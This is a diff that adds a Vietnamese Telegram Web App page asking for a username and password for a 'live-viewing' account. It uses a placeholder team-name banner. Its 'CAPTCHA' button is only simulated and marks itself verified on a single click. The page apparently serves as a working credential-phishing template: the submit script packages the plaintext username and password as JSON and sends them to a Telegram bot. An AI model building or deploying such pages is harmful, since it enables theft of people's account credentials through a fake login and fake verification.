@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Liên Kết</title>
+    <!-- Nhúng thư viện Telegram Web App -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a24; /* Màu nền tối giống ảnh */
+            color: white;
+            padding: 20px;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #232333;
+            padding: 20px;
+            border-radius: 12px;
+            box-sizing: border-box;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #ccc;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #3a3a4c;
+            background-color: #16161f;
+            color: white;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .btn-captcha {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #0f4b59, #082d38);
+            border: none;
+            border-radius: 8px;
+            color: #00e5ff;
+            font-weight: bold;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background-color: #3b3b4f;
+            border: none;
+            border-radius: 8px;
+            color: #8c8c9e;
+            font-weight: bold;
+            cursor: not-allowed;
+            transition: 0.3s;
+        }
+        .btn-submit.active {
+            background-color: #5c5c8a;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Ảnh/Logo mô phỏng -->
+        <div style="text-align: center; margin-bottom: 20px;">
+            <div style="background-color: black; padding: 20px; border-radius: 8px; border: 1px solid #333;">
+                <span style="color: #ff4d4d; font-weight: bold;">▶ TÊN TEAM CỦA BẠN</span>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>👤 TÊN TÀI KHOẢN XEM LIVE</label>
+            <input type="text" id="username" placeholder="Nhập username">
+        </div>
+
+        <div class="form-group">
+            <label>🔑 MẬT KHẨU</label>
+            <input type="password" id="password" placeholder="Nhập password">
+        </div>
+
+        <button class="btn-captcha" id="captchaBtn">CAPTCHA (Bấm để xác minh)</button>
+        <button class="btn-submit" id="submitBtn" disabled>Hãy nhập mã captcha trước</button>
+    </div>
+
+    <script>
+        // Khởi tạo Telegram Web App
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // Mở rộng full màn hình
+
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const captchaBtn = document.getElementById('captchaBtn');
+        const submitBtn = document.getElementById('submitBtn');
+
+        let isCaptchaDone = false;
+
+        // Xử lý nút Captcha giả lập
+        captchaBtn.addEventListener('click', () => {
+            isCaptchaDone = true;
+            captchaBtn.style.background = 'green';
+            captchaBtn.style.color = 'white';
+            captchaBtn.innerText = 'ĐÃ XÁC MINH ✓';
+            
+            submitBtn.innerText = 'XÁC NHẬN ĐĂNG NHẬP';
+            submitBtn.disabled = false;
+            submitBtn.classList.add('active');
+        });
+
+        // Xử lý gửi dữ liệu về Bot
+        submitBtn.addEventListener('click', () => {
+            const user = usernameInput.value;
+            const pass = passwordInput.value;
+
+            if (!user || !pass) {
+                tg.showAlert("Vui lòng nhập đầy đủ tài khoản và mật khẩu!");
+                return;
+            }
+
+            // Đóng gói dữ liệu thành chuỗi JSON
+            const dataToBot = JSON.stringify({
+                action: 'login',
+                username: user,
+                password: pass
+            });
+
+            // Gửi dữ liệu về Telegram Bot
+            tg.sendData(dataToBot);
+        });
+    </script>
+</body>
+</html>
